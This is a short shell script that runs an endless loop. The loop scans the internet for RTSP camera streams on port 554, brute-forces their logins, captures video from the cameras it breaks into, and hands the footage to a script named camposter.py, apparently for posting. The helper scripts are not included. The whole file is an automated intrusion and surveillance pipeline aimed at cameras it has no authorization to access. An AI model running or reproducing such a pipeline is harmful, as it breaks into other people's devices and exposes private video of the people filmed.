#!/usr/bin/env sh
while true; do
    echo
    echo Gather IPs
    ./fortune_rtsp.py -w 400 -c 32 -t 0.7 -F
    # ./fortune_rtsp_async.py -w 512 -l 200000 | tee local/rtsp_554.txt
    cat local/rtsp_554.txt >> local/potential_rtsp.txt

    echo
    echo Brute
    ./rtsp_brute.py local/rtsp_554.txt \
        -sp > local/bruted.txt
    cat local/bruted.txt >> local/rtsp.txt

    echo
    echo Bruted:
    cat local/bruted.txt

    echo
    echo Capture
    timeout 5m ./rtsp_capture.py local/bruted.txt -ff \
        -cb ./camposter.py
done

